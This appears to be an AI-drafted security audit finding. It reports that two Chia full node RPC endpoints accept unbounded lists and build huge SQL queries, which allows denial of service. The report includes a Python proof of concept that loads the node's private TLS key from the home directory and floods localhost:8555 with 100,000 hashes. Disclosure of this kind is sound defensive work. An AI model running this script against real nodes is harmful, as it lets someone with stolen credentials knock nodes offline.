I now have a clear picture of the vulnerability. Let me verify the contrast between the protected and unprotected paths in the coin store.

### Title
Unbounded `puzzle_hashes` and `names` Lists in Full Node RPC `get_coin_records_by_puzzle_hashes` and `get_coin_records_by_names` Enable Resource-Exhaustion DoS — (`File: chia/full_node/full_node_rpc_api.py`)

---

### Summary

The full node RPC endpoints `get_coin_records_by_puzzle_hashes` and `get_coin_records_by_names` accept caller-supplied lists with no upper-bound check. Each list is forwarded verbatim to `CoinStore` methods that build a single, unbatched SQL `IN (?, ?, …)` clause containing every supplied element and no `LIMIT`. An unprivileged caller who can reach the RPC server can submit a single request carrying hundreds of thousands of hashes, forcing the full node to construct and execute a massive SQLite query that saturates CPU, memory, and I/O, rendering the node unable to process blocks or peer messages for the duration of the attack.

---

### Finding Description

**Entry points — `FullNodeRpcApi`**

`get_coin_records_by_puzzle_hashes` (line 712) reads `request["puzzle_hashes"]` into a Python list and passes it directly to the store with no length guard: [1](#0-0) 

`get_coin_records_by_names` (line 753) does the same for `request["names"]`: [2](#0-1) 

**Unbounded store methods — `CoinStore`**

`get_coin_records_by_puzzle_hashes` constructs a single SQL statement whose `IN` clause is as wide as the caller's list, with no `LIMIT` and no batching: [3](#0-2) 

`get_coin_records_by_names` is identical in structure: [4](#0-3) 

**Contrast with protected paths**

`get_coin_records_by_parent_ids` in the same file uses `to_batches(parent_ids, SQLITE_MAX_VARIABLE_NUMBER)`, a `LIMIT ?` clause, and a hard `max_items=50000` cap: [5](#0-4) 

`get_coin_states_by_puzzle_hashes` applies the same batching and `max_items` pattern: [6](#0-5) 

The wallet-side `get_coin_records` RPC handler enforces both a per-page limit and a per-filter item limit before touching the database: [7](#0-6) 

The full node RPC handlers for `get_coin_records_by_puzzle_hashes` and `get_coin_records_by_names` have none of these protections.

---

### Impact Explanation

The full node runs as a single asyncio process. Although SQLite I/O is dispatched to a thread pool, the query-string construction (`'?,' * (len(puzzle_hashes) - 1)`) and result materialisation (`fetchall()`) happen in that thread and consume proportional memory and CPU. With a sufficiently large list (e.g., 100 000 × 32-byte hashes ≈ 3.2 MB of parameters, well within a default HTTP body limit), the thread is occupied for seconds per request. Flooding the endpoint with concurrent such requests saturates the thread pool and the SQLite WAL reader slots, starving the block-processing and peer-sync coroutines of database access. This produces a **long-lived inability for honest full nodes to process valid blocks and sync updates**, matching the High impact tier.

---

### Likelihood Explanation

The full node RPC is bound to `localhost:8555` by default and requires mutual TLS. However, the client certificate is stored in the user's home directory and is readable by any process running as the same OS user — the same user who typically runs the node. Any co-located process (pool software, third-party wallet, monitoring agent) that has obtained the certificate can reach the endpoint. Node operators who expose the RPC to a LAN or the internet (a documented configuration) widen the surface further. No authentication beyond the certificate is required; no rate limiting exists on these endpoints.

---

### Recommendation

Apply the same pattern already used by `get_coin_records_by_parent_ids` and `get_coin_states_by_puzzle_hashes`:

1. **In the RPC handlers** (`full_node_rpc_api.py`): reject requests whose list length exceeds a configurable constant (e.g., 1 000) before touching the database.
2. **In the `CoinStore` methods** (`coin_store.py`): add a `max_items` parameter, use `to_batches()` to stay within `SQLITE_MAX_VARIABLE_NUMBER`, and append `LIMIT ?` to each batch query, mirroring `get_coin_records_by_parent_ids`.

---

### Proof of Concept

```python
import ssl, json, urllib.request, os

# Reuse the node's own client certificate (readable by the same OS user)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.load_verify_locations(os.path.expanduser(
    "~/.chia/mainnet/config/ssl/full_node/private_full_node.crt"))
ctx.load_cert_chain(
    os.path.expanduser("~/.chia/mainnet/config/ssl/full_node/private_full_node.crt"),
    os.path.expanduser("~/.chia/mainnet/config/ssl/full_node/private_full_node.key"))
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# 100 000 distinct 32-byte puzzle hashes (~3.2 MB of hex strings in JSON)
hashes = [("%064x" % i) for i in range(100_000)]
body = json.dumps({"puzzle_hashes": hashes}).encode()

req = urllib.request.Request(
    "https://localhost:8555/get_coin_records_by_puzzle_hashes",
    data=body,
    headers={"Content-Type": "application/json"},
    method="POST",
)

import time
t0 = time.time()
with urllib.request.urlopen(req, context=ctx) as r:
    r.read()
print(f"elapsed: {time.time()-t0:.1f}s")   # expected: several seconds per request
# Repeat concurrently to exhaust the node's thread pool and SQLite reader slots.
```

The same attack applies to `get_coin_records_by_names` by substituting `"names"` for `"puzzle_hashes"`.

### Citations

**File:** chia/full_node/full_node_rpc_api.py (L712-732)
```python
    async def get_coin_records_by_puzzle_hashes(self, request: dict[str, Any]) -> EndpointResult:
        """
        Retrieves the coins for a given puzzlehash, by default returns unspent coins.
        """
        if "puzzle_hashes" not in request:
            raise RpcError.simple(RpcErrorCodes.PUZZLE_HASHES_NOT_IN_REQUEST, "Puzzle hashes not in request")
        kwargs: dict[str, Any] = {
            "include_spent_coins": False,
            "puzzle_hashes": [hexstr_to_bytes(ph) for ph in request["puzzle_hashes"]],
        }
        if "start_height" in request:
            kwargs["start_height"] = uint32(request["start_height"])
        if "end_height" in request:
            kwargs["end_height"] = uint32(request["end_height"])

        if "include_spent_coins" in request:
            kwargs["include_spent_coins"] = request["include_spent_coins"]

        coin_records = await self.service.blockchain.coin_store.get_coin_records_by_puzzle_hashes(**kwargs)

        return {"coin_records": [coin_record_dict_backwards_compat(cr.to_json_dict()) for cr in coin_records]}
```

**File:** chia/full_node/full_node_rpc_api.py (L753-773)
```python
    async def get_coin_records_by_names(self, request: dict[str, Any]) -> EndpointResult:
        """
        Retrieves the coins for given coin IDs, by default returns unspent coins.
        """
        if "names" not in request:
            raise RpcError.simple(RpcErrorCodes.NAMES_NOT_IN_REQUEST, "Names not in request")
        kwargs: dict[str, Any] = {
            "include_spent_coins": False,
            "names": [hexstr_to_bytes(name) for name in request["names"]],
        }
        if "start_height" in request:
            kwargs["start_height"] = uint32(request["start_height"])
        if "end_height" in request:
            kwargs["end_height"] = uint32(request["end_height"])

        if "include_spent_coins" in request:
            kwargs["include_spent_coins"] = request["include_spent_coins"]

        coin_records = await self.service.blockchain.coin_store.get_coin_records_by_names(**kwargs)

        return {"coin_records": [coin_record_dict_backwards_compat(cr.to_json_dict()) for cr in coin_records]}
```

**File:** chia/full_node/coin_store.py (L280-307)
```python
    async def get_coin_records_by_puzzle_hashes(
        self,
        include_spent_coins: bool,
        puzzle_hashes: list[bytes32],
        start_height: uint32 = uint32(0),
        end_height: uint32 = uint32((2**32) - 1),
    ) -> list[CoinRecord]:
        if len(puzzle_hashes) == 0:
            return []

        coins = set()
        puzzle_hashes_db: tuple[Any, ...]
        puzzle_hashes_db = tuple(puzzle_hashes)

        async with self.db_wrapper.reader_no_transaction() as conn:
            async with conn.execute(
                f"SELECT confirmed_index, spent_index, coinbase, puzzle_hash, "
                f"coin_parent, amount, timestamp FROM coin_record INDEXED BY coin_puzzle_hash "
                f"WHERE puzzle_hash in ({'?,' * (len(puzzle_hashes) - 1)}?) "
                f"AND confirmed_index>=? AND confirmed_index<? "
                f"{'' if include_spent_coins else 'AND spent_index <= 0'}",
                (*puzzle_hashes_db, start_height, end_height),
            ) as cursor:
                for row in await cursor.fetchall():
                    coin = self.row_to_coin(row)
                    spent_index = uint32(0) if row[1] <= 0 else uint32(row[1])
                    coins.add(CoinRecord(coin, row[0], spent_index, row[2] != 0, row[6]))
                return list(coins)
```

**File:** chia/full_node/coin_store.py (L309-335)
```python
    async def get_coin_records_by_names(
        self,
        include_spent_coins: bool,
        names: list[bytes32],
        start_height: uint32 = uint32(0),
        end_height: uint32 = uint32((2**32) - 1),
    ) -> list[CoinRecord]:
        if len(names) == 0:
            return []

        coins = set()

        async with self.db_wrapper.reader_no_transaction() as conn:
            async with conn.execute(
                f"SELECT confirmed_index, spent_index, coinbase, puzzle_hash, "
                f"coin_parent, amount, timestamp FROM coin_record INDEXED BY sqlite_autoindex_coin_record_1 "
                f"WHERE coin_name in ({'?,' * (len(names) - 1)}?) "
                f"AND confirmed_index>=? AND confirmed_index<? "
                f"{'' if include_spent_coins else 'AND spent_index <= 0'}",
                [*names, start_height, end_height],
            ) as cursor:
                for row in await cursor.fetchall():
                    coin = self.row_to_coin(row)
                    spent_index = uint32(0) if row[1] <= 0 else uint32(row[1])
                    coins.add(CoinRecord(coin, row[0], spent_index, row[2] != 0, row[6]))

        return list(coins)
```

**File:** chia/full_node/coin_store.py (L347-378)
```python
    async def get_coin_states_by_puzzle_hashes(
        self,
        include_spent_coins: bool,
        puzzle_hashes: set[bytes32],
        min_height: uint32 = uint32(0),
        *,
        max_items: int = 50000,
    ) -> set[CoinState]:
        if len(puzzle_hashes) == 0:
            return set()

        coins: set[CoinState] = set()
        async with self.db_wrapper.reader_no_transaction() as conn:
            for batch in to_batches(puzzle_hashes, SQLITE_MAX_VARIABLE_NUMBER):
                puzzle_hashes_db: tuple[Any, ...] = tuple(batch.entries)
                async with conn.execute(
                    f"SELECT confirmed_index, spent_index, coinbase, puzzle_hash, "
                    f"coin_parent, amount, timestamp FROM coin_record INDEXED BY coin_puzzle_hash "
                    f"WHERE puzzle_hash in ({'?,' * (len(batch.entries) - 1)}?) "
                    f"AND (confirmed_index>=? OR spent_index>=?)"
                    f"{'' if include_spent_coins else ' AND spent_index <= 0'}"
                    " LIMIT ?",
                    (*puzzle_hashes_db, min_height, min_height, max_items - len(coins)),
                ) as cursor:
                    row: sqlite3.Row
                    for row in await cursor.fetchall():
                        coins.add(self.row_to_coin_state(row))

                if len(coins) >= max_items:
                    break

        return coins
```

**File:** chia/full_node/coin_store.py (L380-411)
```python
    async def get_coin_records_by_parent_ids(
        self,
        include_spent_coins: bool,
        parent_ids: list[bytes32],
        start_height: uint32 = uint32(0),
        end_height: uint32 = uint32((2**32) - 1),
        *,
        max_items: int = 50000,
    ) -> list[CoinRecord]:
        if len(parent_ids) == 0:
            return []

        coins: set[CoinRecord] = set()
        async with self.db_wrapper.reader_no_transaction() as conn:
            for batch in to_batches(parent_ids, SQLITE_MAX_VARIABLE_NUMBER):
                parent_ids_db: tuple[Any, ...] = tuple(batch.entries)
                async with conn.execute(
                    f"SELECT confirmed_index, spent_index, coinbase, puzzle_hash, coin_parent, amount, timestamp "
                    f"FROM coin_record WHERE coin_parent in ({'?,' * (len(batch.entries) - 1)}?) "
                    f"AND confirmed_index>=? AND confirmed_index<? "
                    f"{'' if include_spent_coins else 'AND spent_index <= 0'}"
                    " LIMIT ?",
                    (*parent_ids_db, start_height, end_height, max_items - len(coins)),
                ) as cursor:
                    async for row in cursor:
                        coin = self.row_to_coin(row)
                        spent_index = uint32(0) if row[1] <= 0 else uint32(row[1])
                        coins.add(CoinRecord(coin, row[0], spent_index, row[2] != 0, row[6]))
                if len(coins) >= max_items:
                    break

        return list(coins)
```

**File:** chia/wallet/wallet_rpc_api.py (L3046-3060)
```python
        if parsed_request.limit != uint32.MAXIMUM and parsed_request.limit > self.max_get_coin_records_limit:
            raise ValueError(f"limit of {self.max_get_coin_records_limit} exceeded: {parsed_request.limit}")

        for filter_name, filter in {
            "coin_id_filter": parsed_request.coin_id_filter,
            "puzzle_hash_filter": parsed_request.puzzle_hash_filter,
            "parent_coin_id_filter": parsed_request.parent_coin_id_filter,
            "amount_filter": parsed_request.amount_filter,
        }.items():
            if filter is None:
                continue
            if len(filter.values) > self.max_get_coin_records_filter_items:
                raise ValueError(
                    f"{filter_name} max items {self.max_get_coin_records_filter_items} exceeded: {len(filter.values)}"
                )
```
